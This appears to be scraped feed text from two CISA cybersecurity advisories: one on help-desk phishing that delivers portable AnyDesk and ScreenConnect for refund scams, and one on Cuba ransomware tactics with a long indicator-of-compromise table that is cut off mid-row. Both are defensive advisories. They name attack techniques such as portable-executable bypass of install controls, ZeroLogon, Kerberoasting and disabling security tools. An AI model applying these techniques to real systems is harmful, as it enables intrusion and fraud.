<h4><strong>Malicious Cyber Activity</strong></h4>
<p>The authoring organizations assess that since at least June 2022, cyber criminal actors have sent help desk-themed phishing emails to FCEB federal staff’s personal, and government email addresses. The emails either contain a link to a “first-stage” malicious domain or prompt the recipients to call the cybercriminals, who then try to convince the recipients to visit the first-stage malicious domain. See figure 1 for an example phishing email obtained from an FCEB network.</p>
<p> </p>



<figure class="c-figure c-figure--image u-align-center" role="group"><div class="c-figure__media">    <img loading="lazy" src="https://www.cisa.gov/sites/default/files/styles/large/public/2023-02/aa23-025a%20Figure%201%20Help%20desk-themed%20phishing%20email%20example.png?itok=uCoj5hac" width="618" height="799" alt="aa23-025a Figure 1 Help desk-themed phishing email example" /></div>
      <figcaption class="c-figure__caption"><em>Figure 1</em>: <em>Help desk</em>-<em>themed phishing email example</em></figcaption></figure><p> </p>
<p>The recipient visiting the first-stage malicious domain triggers the download of an executable. The executable then connects to a “second-stage” malicious domain, from which it downloads additional RMM software.</p>
<p>CISA noted that the actors did not install downloaded RMM clients on the compromised host. Instead, the actors downloaded AnyDesk and ScreenConnect as self-contained, portable executables configured to connect to the actor’s RMM server.</p>
<p><strong>Note:</strong> Portable executables launch within the user’s context without installation. Because portable executables do not require administrator privileges, they can allow execution of unapproved software even if a risk management control may be in place to audit or block the same software’s installation on the network. Threat actors can leverage a portable executable with local user rights to attack other vulnerable machines within the local intranet or establish long term persistent access as a local user service.</p>
<p>CISA has observed that multiple first-stage domain names follow naming patterns used for IT help/support themed social-engineering, e.g., hservice[.]live, gscare[.]live, nhelpcare[.]info, deskcareme[.]live, nhelpcare[.]cc). According to Silent Push, some of these malicious domains impersonate known brands such as, Norton, GeekSupport, Geek Squad, Amazon, Microsoft, McAfee, and PayPal.[<a href="https://www.silentpush.com/blog/silent-push-uncovers-a-large-phishing-operation-featuring-amazon-geek-squad-mcafee-microsoft-norton-and-paypal-domains">1</a>] CISA has also observed that the first-stage malicious domain linked in the initial phishing email periodically redirects to other sites for additional redirects and downloads of RMM software.</p>
<h4><strong>Use of Remote Monitoring and Management Tools</strong></h4>
<p>In this campaign, after downloading the RMM software, the actors used the software to initiate a refund scam. They first connected to the recipient’s system and enticed the recipient to log into their bank account while remaining connected to the system. The actors then used their access through the RMM software to modify the recipient’s bank account summary. The falsely modified bank account summary showed the recipient was mistakenly refunded an excess amount of money. The actors then instructed the recipient to “refund” this excess amount to the scam operator.<br />
Although this specific activity appears to be financially motivated and targets individuals, the access could lead to additional malicious activity against the recipient’s organization—from both other cybercriminals and APT actors. Network defenders should be aware that:</p>
<ul><li>Although the cybercriminal actors in this campaign used ScreenConnect and AnyDesk, threat actors can maliciously leverage any legitimate RMM software.</li>
<li>Because threat actors can download legitimate RMM software as self-contained, portable executables, they can bypass both administrative privilege requirements and software management control policies.</li>
<li>The use of RMM software generally does not trigger antivirus or antimalware defenses.</li>
<li>Malicious cyber actors are known to leverage legitimate RMM and remote desktop software as backdoors for persistence and for C2.[<a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-277a">2</a>],[<a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-055a">3</a>],[<a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-152a">4</a>],[<a href="https://www.cisa.gov/uscert/ncas/alerts/aa21-042a">5</a>],[<a href="https://www.cisa.gov/uscert/ncas/alerts/aa20-301a">6</a>],[<a href="https://www.cisa.gov/uscert/ncas/alerts/aa20-107a">7</a>],[<a href="https://www.fbi.gov/contact-us/field-offices/boston/news/press-releases/fbi-warns-public-to-beware-of-tech-support-scammers-targeting-financial-accounts-using-remote-desktop-software">8</a>]</li>
<li>RMM software allows cyber threat actors to avoid using custom malware.</li>
</ul><p>Threat actors often target legitimate users of RMM software. Targets can include managed service providers (MSPs) and IT help desks, who regularly use legitimate RMM software for technical and security end-user support, network management, endpoint monitoring, and to interact remotely with hosts for IT-support functions. These threat actors can exploit trust relationships in MSP networks and gain access to a large number of the victim MSP's customers. MSP compromises can introduce significant risk—such as <a href="https://www.cisa.gov/uscert/kaseya-ransomware-attack">ransomware</a> and <a href="https://cisa.gov/uscert/sites/default/files/publications/Chinese-Cyber-Activity-Targeting-Managed-Service-Providers.pdf">cyber espionage</a>—to the MSP’s customers.</p>
<p>The authoring organizations strongly encourage network defenders to apply the recommendations in the Mitigations section of this CSA to protect against malicious use of legitimate RMM software.</p>
<h3><strong>INDICATORS OF COMPROMISE</strong></h3>
<p>See table 1 for IOCs associated with the campaign detailed in this CSA.</p>
<table class="Table"><caption><em>Table 1: Malicious Domains and IP addresses observed by CISA</em></caption>
<tbody><tr><td>
<p><strong>Domain</strong></p>
</td>
<td>
<p><strong>Description</strong></p>
</td>
<td>
<p><strong>Date(s) Observed</strong></p>
</td>
</tr><tr><td>
<p>win03[.]xyz</p>
</td>
<td>
<p>Suspected first-stage malware domain</p>
</td>
<td>
<p>June 1, 2022</p>
<p>July 19, 2022</p>
</td>
</tr><tr><td>
<p>myhelpcare[.]online</p>
</td>
<td>
<p>Suspected first-stage malware domain</p>
</td>
<td>
<p>June 14, 2022</p>
<p> </p>
</td>
</tr><tr><td>
<p>win01[.]xyz</p>
</td>
<td>
<p>Suspected first-stage malware domain</p>
</td>
<td>
<p>August 3, 2022</p>
<p>August 18, 2022</p>
</td>
</tr><tr><td>
<p>myhelpcare[.]cc</p>
</td>
<td>
<p>Suspected first-stage malware domain</p>
</td>
<td>
<p>September 14, 2022</p>
</td>
</tr><tr><td>
<p>247secure[.]us</p>
</td>
<td>
<p>Second-stage malicious domain</p>
</td>
<td>
<p>October 19, 2022</p>
<p>November 10, 2022</p>
</td>
</tr></tbody></table><p> </p>
<p>Additional resources to detect possible exploitation or compromise:</p>
<ul><li>Silent Push: <a href="https://www.silentpush.com/blog/silent-push-uncovers-a-large-phishing-operation-featuring-amazon-geek-squad-mcafee-microsoft-norton-and-paypal-domains">Silent Push uncovers a large trojan operation featuring Amazon, Microsoft, Geek Squad, McAfee, Norton, and Paypal domains</a>.</li>
</ul><div>
<h3>Mitigations</h3>
</div>
<p>The authoring organizations encourage network defenders to:</p>
<ul><li>Implement best practices to block phishing emails. See <a href="https://cisa.gov/sites/default/files/publications/phishing-infographic-508c.pdf">CISA’s Phishing Infographic</a> for more information.</li>
<li>Audit remote access tools on your network to identify currently used and/or authorized RMM software.</li>
<li>Review logs for execution of RMM software to detect abnormal use of programs running as a portable executable.</li>
<li>Use security software to detect instances of RMM software only being loaded in memory.</li>
<li>Implement application controls to manage and control execution of software, including allowlisting RMM programs.
<ul><li>See NSA Cybersecurity Information sheet <a href="https://media.defense.gov/2019/Sep/09/2002180334/-1/-1/0/Enforce%20Signed%20Software%20Execution%20Policies%20-%20Copy.pdf">Enforce Signed Software Execution Policies</a>.</li>
<li>Application controls should prevent both installation and execution of portable versions of unauthorized RMM software.</li>
</ul></li>
<li>Require authorized RMM solutions only be used from within your network over approved remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces (VDIs).</li>
<li>Block both inbound and outbound connections on common RMM ports and protocols at the network perimeter. </li>
<li>Implement a user training program and phishing exercises to raise awareness among users about the risks of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments. Reinforce the appropriate user response to phishing and spearphishing emails.</li>
</ul><h3><strong>RESOURCES</strong></h3>
<ul><li>See CISA Insights <a href="https://cisa.gov/sites/default/files/publications/CISA%20Insights_Guidance-for-MSPs-and-Small-and-Mid-sized-Businesses_S508C.pdf">Mitigations and Hardening Guidance for MSPs and Small- and Mid-sized Businesses</a> for guidance on hardening MSP and customer infrastructure.</li>
<li>U.S. Defense Industrial Base (DIB) Sector organizations may consider signing up for the NSA Cybersecurity Collaboration Center’s DIB Cybersecurity Service Offerings, including Protective Domain Name System (PDNS) services, vulnerability scanning, and threat intelligence collaboration for eligible organizations. For more information on how to enroll in these services, email <a href="mailto:dib_defense@cyber.nsa.gov">dib_defense@cyber.nsa.gov</a>.</li>
<li>CISA offers several Vulnerability Scanning to help organizations reduce their exposure to threats by taking a proactive approach to mitigating attack vectors. See <a href="https://www.cisa.gov/cyber-hygiene-services">cisa.gov/cyber-hygiene-services</a>.</li>
<li>Consider participating in CISA’s <a href="https://www.cisa.gov/ais">Automated Indicator Sharing (AIS)</a> to receive real-time exchange of machine-readable cyber threat indicators and defensive measures. AIS is offered at no cost to participants as part of CISA’s mission to work with our public and private sector partners to identify and help mitigate cyber threats through information sharing and provide technical assistance, upon request, that helps prevent, detect, and respond to incidents.</li>
</ul><h3><strong>PURPOSE</strong></h3>
<p>This advisory was developed by CISA, NSA, and MS-ISAC in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations.</p>
<h3><strong>DISCLAIMER</strong></h3>
<p>The information in this report is being provided “as is” for informational purposes only. CISA, NSA, and MS-ISAC do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring.</p>
<div>
<h3>References</h3>
</div>
<div class="field--item"><a href="https://www.silentpush.com/blog/silent-push-uncovers-a-large-phishing-operation-featuring-amazon-geek-squad-mcafee-microsoft-norton-and-paypal-domains">[1] Silent Push uncovers a large trojan operation featuring Amazon, Microsoft, Geek Squad, McAfee, Norton, and Paypal domains. — Silent Push Threat Intelligence</a></div>
<div class="field--item"><a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-277a">[2] Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization | CISA</a></div>
<div class="field--item"><a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-055a">[3] Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government and Commercial Networks | CISA</a></div>
<div class="field--item"><a href="https://www.cisa.gov/uscert/ncas/alerts/aa22-152a">[4] Karakurt Data Extortion Group | CISA</a></div>
<div class="field--item"><a href="https://www.cisa.gov/uscert/ncas/alerts/aa21-042a">[5] Compromise of U.S. Water Treatment Facility | CISA</a></div>
<div class="field--item"><a href="https://www.cisa.gov/uscert/ncas/alerts/aa20-301a">[6] North Korean Advanced Persistent Threat Focus: Kimsuky | CISA</a></div>
<div class="field--item"><a href="https://www.cisa.gov/uscert/ncas/alerts/aa20-107a">[7] Continued Threat Actor Exploitation Post Pulse Secure VPN Patching | CISA</a></div>
<div class="field--item"><a href="https://www.fbi.gov/contact-us/field-offices/boston/news/press-releases/fbi-warns-public-to-beware-of-tech-support-scammers-targeting-financial-accounts-using-remote-desktop-software">[8] FBI Warns Public to Beware of Tech Support Scammers Targeting Financial Accounts Using Remote Desktop Software — FBI</a></div>
<div>
<h3>Revisions</h3>
</div>
<p>January 25, 2023: Initial Version</p>

## pubDate
Tue, 31 Jan 2023 16:32:46 EST
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17121
## -
## title
#StopRansomware: Cuba Ransomware
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-335a
## description
<div>
<h3>Summary</h3>
</div>
<p>Actions to take today to mitigate cyber threats from ransomware:</p>
<p>• Prioritize remediating <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">known exploited vulnerabilities</a>.<br />
• Train users to recognize and report <a href="https://www.cisa.gov/publication/phishing-postcard">phishing attempts</a>.<br />
• Enable and enforce phishing-resistant multifactor authentication.</p>
<p><em>Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit <a href="https://www.cisa.gov/stopransomware">stopransomware.gov</a> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The FBI and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Cuba ransomware IOCs and TTPs associated with Cuba ransomware actors identified through FBI investigations, third-party reporting, and open-source reporting. This advisory updates the December 2021 <a href="https://www.ic3.gov/Media/News/2021/211203-2.pdf">FBI Flash: Indicators of Compromise Associated with Cuba Ransomware</a>.</p>
<p><strong>Note:</strong> While this ransomware is known by industry as “Cuba ransomware,” there is no indication Cuba ransomware actors have any connection or affiliation with the Republic of Cuba.</p>
<p>Since the release of the December 2021 FBI Flash, the number of U.S. entities compromised by Cuba ransomware has doubled, with ransoms demanded and paid on the increase.</p>
<p>This year, Cuba ransomware actors have added to their TTPs, and third-party and open-source reports have identified a possible link between Cuba ransomware actors, RomCom Remote Access Trojan (RAT) actors, and Industrial Spy ransomware actors.</p>
<p>FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of Cuba ransomware and other ransomware operations.</p>
<p>Download the PDF version of this report: <a href="https://www.cisa.gov/sites/default/files/publications/aa22-335a-stopransomware-cuba-ransomware.pdf">pdf, 649 kb</a>.</p>
<p>For a downloadable copy of IOCs, see:</p>
<ul><li><a href="https://www.cisa.gov/sites/default/files/publications/AA22-335A%20StopRansomware%20Cuba%20Ransomware.stix.xml">AA22-335A.stix</a> (STIX 148 kb).</li>
<li><strong>(Updated December 12, 2022)</strong> <a href="https://www.cisa.gov/sites/default/files/publications/AA22-335A-2.stix.xml">AA22-335A-2.stix</a> (STIX, 67 kb). <strong>(End of Update.)</strong></li>
</ul><div>
<h3>Technical Details</h3>
</div>
<h4>Overview</h4>
<p>Since the December 2021 release of <a href="https://www.ic3.gov/Media/News/2021/211203-2.pdf">FBI Flash: Indicators of Compromise Associated with Cuba Ransomware</a>, FBI has observed Cuba ransomware actors continuing to target U.S. entities in the following five <a href="https://www.cisa.gov/critical-infrastructure-sectors">critical infrastructure sectors</a>: Financial Services, Government Facilities, Healthcare and Public Health, Critical Manufacturing, and Information Technology. As of August 2022, FBI has identified that Cuba ransomware actors have:</p>
<ul><li>Compromised 101 entities, 65 in the United States and 36 outside the United States.</li>
<li>Demanded 145 million U.S. Dollars (USD) and received 60 million USD in ransom payments.</li>
</ul><h4>Cuba Ransomware Actors’ Tactics, Techniques, and Procedures</h4>
<p>As previously reported by FBI, Cuba ransomware actors have leveraged the following techniques to gain initial access into dozens of entities in multiple critical infrastructure sectors:</p>
<ul><li>Known vulnerabilities in commercial software [<a href="https://attack.mitre.org/versions/v12/techniques/T1190/">T1190</a>]</li>
<li>Phishing campaigns [<a href="https://attack.mitre.org/versions/v12/techniques/T1566/">T1566</a>]</li>
<li>Compromised credentials [<a href="https://attack.mitre.org/versions/v12/techniques/T1078/">T1078</a>]</li>
<li>Legitimate remote desktop protocol (RDP) tools [<a href="https://attack.mitre.org/versions/v12/techniques/T1563/002/">T1563.002</a>]</li>
</ul><p>After gaining initial access, the actors distributed Cuba ransomware on compromised systems through <a href="https://attack.mitre.org/versions/v12/software/S0499/">Hancitor</a>—a loader known for dropping or executing stealers, such as Remote Access Trojans (RATs) and other types of ransomware, onto victims’ networks.</p>
<p>Since spring 2022, Cuba ransomware actors have modified their TTPs and tools to interact with compromised networks and extort payments from victims.[<a href="https://unit42.paloaltonetworks.com/atoms/tropicalscorpius/">1</a>],[<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>]</p>
<p>Cuba ransomware actors have exploited known vulnerabilities and weaknesses and have used tools to elevate privileges on compromised systems. According to Palo Alto Networks Unit 42,[<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>] Cuba ransomware actors have:</p>
<ul><li>Exploited <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24521">CVE-2022-24521</a> in the Windows Common Log File System (CLFS) driver to steal system tokens and elevate privileges.</li>
<li>Used a PowerShell script to identify and target service accounts for their associated Active Directory Kerberos ticket. The actors then collected and cracked the Kerberos tickets offline via Kerberoasting [<a href="https://attack.mitre.org/versions/v12/techniques/T1558/003/">T1558.003</a>].</li>
<li>Used a tool, called KerberCache, to extract cached Kerberos tickets from a host’s Local Security Authority Server Service (LSASS) memory [<a href="https://attack.mitre.org/versions/v12/techniques/T1003/001/">T1003.001</a>].</li>
<li>Used a tool to exploit <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-1472">CVE-2020-1472</a> (also known as “ZeroLogon”) to gain Domain Administrative privileges [<a href="https://attack.mitre.org/versions/v12/techniques/T1068/">T1068</a>]. This tool and its intrusion attempts have been reportedly related to <a href="https://attack.mitre.org/versions/v12/software/S0499/">Hancitor</a> and Qbot.</li>
</ul><p>According to Palo Alto Networks Unit 42, Cuba ransomware actors use tools to evade detection while moving laterally through compromised environments before executing Cuba ransomware. Specifically, the actors, “leveraged a dropper that writes a kernel driver to the file system called ApcHelper.sys. This targets and terminates security products. The dropper was not signed; however, the kernel driver was signed using the certificate found in the LAPSUS NVIDIA leak." [<a href="https://attack.mitre.org/versions/v12/techniques/T1562/001/">T1562.001</a>].[<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>]</p>
<p>In addition to deploying ransomware, the actors have used “double extortion” techniques, in which they exfiltrate victim data, and (1) demand a ransom payment to decrypt it and, (2) threaten to publicly release it if a ransom payment is not made.[<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>]</p>
<h4>Cuba Ransomware Link to RomCom and Industrial Spy Marketplace</h4>
<p>Since spring 2022, third-party and open-source reports have identified an apparent link between Cuba ransomware actors, RomCom RAT actors, and Industrial Spy ransomware actors:</p>
<ul><li>According to Palo Alto Networks Unit 42, Cuba ransomware actors began using RomCom malware, a custom RAT, for command and control (C2).[<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>]</li>
<li>Cuba ransomware actors may also be leveraging Industrial Spy ransomware. According to third-party reporting, suspected Cuba ransomware actors compromised a foreign healthcare company. The threat actors deployed Industrial Spy ransomware, which shares distinct similarities in configuration to Cuba ransomware. Before deploying the ransomware, the actors moved laterally using <a href="https://attack.mitre.org/versions/v12/software/S0357/">Impacket</a> and deployed the RomCom RAT and Meterpreter Reverse Shell HTTP/HTTPS proxy via a C2 server [<a href="https://attack.mitre.org/versions/v12/techniques/T1090/">T1090</a>].</li>
<li>Cuba ransomware actors initially used their leak site to sell stolen data; however, around May 2022, the actors began selling their data on Industrial Spy’s online market for selling stolen data.[<a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">2</a>]</li>
</ul><p>RomCom actors have targeted foreign military organizations, IT companies, food brokers and manufacturers.[<a href="https://blogs.blackberry.com/en/2022/10/unattributed-romcom-threat-actor-spoofing-popular-apps-now-hits-ukrainian-militaries">3</a>][<a href="https://blogs.blackberry.com/en/2022/11/romcom-spoofing-solarwinds-keepass">4</a>] The actors copied legitimate HTML code from public-facing webpages, modified the code, and then incorporated it in spoofed domains [<a href="https://attack.mitre.org/versions/v12/techniques/T1584/001/">T1584.001</a>], which allowed the RomCom actors to:</p>
<ul><li>Host counterfeit Trojanized applications for
<ul><li>SolarWinds Network Performance Monitor (NPM),</li>
<li>KeePass password manager,</li>
<li>PDF Reader Pro, (by PDF Technologies, Inc., not an Adobe Acrobat or Reader product), and</li>
<li>Advanced IP Scanner software;</li>
</ul></li>
<li>Deploy the RomCom RAT as the final stage.</li>
</ul><h3>INDICATORS OF COMPROMISE</h3>
<p>See tables 1 through 5 for Cuba ransomware IOCs that FBI obtained during threat response investigations as of late August 2022. In addition to these tables, see the publications in the References section below for aid in detecting possible exploitation or compromise.</p>
<p><strong>Note:</strong> For IOCs as of early November 2021, see <a href="https://www.ic3.gov/Media/News/2021/211203-2.pdf">FBI Flash: Indicators of Compromise Associated with Cuba Ransomware</a>.</p>
<table class="Table tablesaw tablesaw-stack" data-tablesaw-mode="stack" data-tablesaw-minimap=""><thead></thead><caption><em>Table 1: Cuba Ransomware Associated Files and Hashes, as of Late August 2022</em></caption>
<tbody><tr><td>
<p>File Name</p>
</td>
<td>
<p>File Path</p>
</td>
<td>
<p>File Hash</p>
</td>
</tr></tbody><tbody><tr><td>
<p>netping.dll</p>
</td>
<td>
<p>c:\windows\temp</p>
</td>
<td>
<p>SHA256: f1103e627311e73d5f29e877243e7ca203292f9419303c661aec57745eb4f26c</p>
</td>
</tr><tr><td>
<p>shar.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>MD5: 4c32ef0836a0af7025e97c6253054bca</p>
<p>SHA256: a7c207b9b83648f69d6387780b1168e2f1eabd23ae6e162dd700ae8112f8b96c</p>
</td>
</tr><tr><td>
<p>Psexesvc.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 141b2190f51397dbd0dfde0e3904b264c91b6f81febc823ff0c33da980b69944</p>
</td>
</tr><tr><td>
<p>1.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>216155s.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>23246s.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 02a733920c7e69469164316e3e96850d55fca9f5f9d19a241fad906466ec8ae8</p>
</td>
</tr><tr><td>
<p>23246s.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 0cf6399db55d40bc790a399c6bbded375f5a278dc57a143e4b21ea3f402f551f</p>
</td>
</tr><tr><td>
<p>23246st.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: f5db51115fa0c910262828d0943171d640b4748e51c9a140d06ea81ae6ea1710</p>
</td>
</tr><tr><td>
<p>259238e.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>31-100.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>3184.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>3184.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>45.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: </p>
<p>857f28b8fe31cf5db6d45d909547b151a66532951f26cda5f3320d2d4461b583</p>
</td>
</tr><tr><td>
<p>4ca736d.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>62e2e37.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>64.235.39.82</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>64s.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>7z.sfx</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>7zCon.sfx</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>7-zip.chm</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>82.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>9479.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 08eb4366fc0722696edb03981f00778701266a2e57c40cd2e9d765bf8b0a34d0</p>
</td>
</tr><tr><td>
<p>9479p.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: f8144fa96c036a8204c7bc285e295f9cd2d1deb0379e39ee8a8414531104dc4a</p>
</td>
</tr><tr><td>
<p>9479p.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 88d13669a994d2e04ec0a9940f07ab8aab8563eb845a9c13f2b0fec497df5b17</p>
</td>
</tr><tr><td>
<p>a.exe</p>
<p> </p>
</td>
<td>
<p> </p>
</td>
<td>
<p>MD5: 03c835b684b21ded9a4ab285e4f686a3</p>
<p> </p>
<p>SHA1: eaced2fcfdcbf3dca4dd77333aaab055345f3ab4</p>
<p> </p>
<p>SHA256: 0f385cc69a93abeaf84994e7887cb173e889d309a515b55b2205805bdfe468a3</p>
<p> </p>
<p>SHA256: 0d5e3483299242bf504bd3780487f66f2ec4f48a7b38baa6c6bc8ba16e4fb605</p>
<p> </p>
<p>SHA256: 7e00bfb622072f53733074795ab581cf6d1a8b4fc269a50919dda6350209913c</p>
<p> </p>
<p>SHA256: af4523186fe4a5e2833bbbe14939d8c3bd352a47a2f77592d8adcb569621ce02</p>
</td>
</tr><tr><td>
<p>a220.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>a220.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 8a3d71c668574ad6e7406d3227ba5adc5a230dd3057edddc4d0ec5f8134d76c3</p>
</td>
</tr><tr><td>
<p>a82.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 4306c5d152cdd86f3506f91633ef3ae7d8cf0dd25f3e37bec43423c4742f4c42</p>
</td>
</tr><tr><td>
<p>a91.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 3d4502066a338e19df58aa4936c37427feecce9ab8d43abff4a7367643ae39ce</p>
</td>
</tr><tr><td>
<p>a99.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: f538b035c3de87f9f8294bec272c1182f90832a4e86db1e47cbb1ab26c9f3a0b</p>
</td>
</tr><tr><td>
<p>aa.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>aa2.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>aaa.stage.16549040.dns.alleivice.com</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>add2.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>advapi32.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>agent.13.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>agent.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: fd87ca28899823b37b2c239fbbd236c555bcab7768d67203f86d37ede19dd975</p>
</td>
</tr><tr><td>
<p>agent.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>agent13.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>agent13.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 1817cc163482eb21308adbd43fb6be57fcb5ff11fd74b344469190bb48d8163b</p>
</td>
</tr><tr><td>
<p>agent64.bin</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: bff4dd37febd5465e0091d9ea68006be475c0191bd8c7a79a44fbf4b99544ef1</p>
</td>
</tr><tr><td>
<p>agsyst121.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>agsyst121.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>all.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: ecefd9bb8b3783a81ab934b44eb3d84df5e58f0289f089ef6760264352cf878a</p>
</td>
</tr><tr><td>
<p>all.dll</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: db3b1f224aec1a7c58946d819d729d0903751d1867113aae5cca87e38c653cf4</p>
</td>
</tr><tr><td>
<p>anet.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA1: 241ce8af441db2d61f3eb7852f434642739a6cc3</p>
<p> </p>
<p>SHA256: 74fbf3cc44dd070bd5cb87ca2eed03e1bbeec4fec644a25621052f0a73abbe84</p>
<p> </p>
<p>SHA256: b160bd46b6efc6d79bfb76cf3eeacca2300050248969decba139e9e1cbeebf53</p>
<p>SHA256: f869e8fbd8aa1f037ad862cf6e8bbbf797ff49556fb100f2197be4ee196a89ae</p>
</td>
</tr><tr><td>
<p>App.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>appnetwork.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>AppVClient.man</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>aswSP_arPot2</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>aus.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: 0c2ffed470e954d2bf22807ba52c1ffd1ecce15779c0afdf15c292e3444cf674</p>
<p>SHA256: 310afba59ab8e1bda3ef750a64bf39133e15c89e8c7cf4ac65ee463b26b136ba</p>
</td>
</tr><tr><td>
<p>av.bat</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>SHA256: b5d202456ac2ce7d1285b9c0e2e5b7ddc03da1cbca51b5da98d9ad72e7f773b8</p>
</td>
</tr><tr><td>
<p>c2.ps1</p>
</td>
<td>
<p> </p>
</td>
<td> </td>
</tr><tr><td>
<p>c2.ps1</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>cdzehhlzcwvzcmcr.aspx</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>check.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>checkk.exe</p>
</td>
<td>
<p> </p>
</td>
<td>
<p> </p>
</td>
</tr><tr><td>
<p>checkk.txt</p>
</td>
<td>
<p> </p>
</td>
<td>
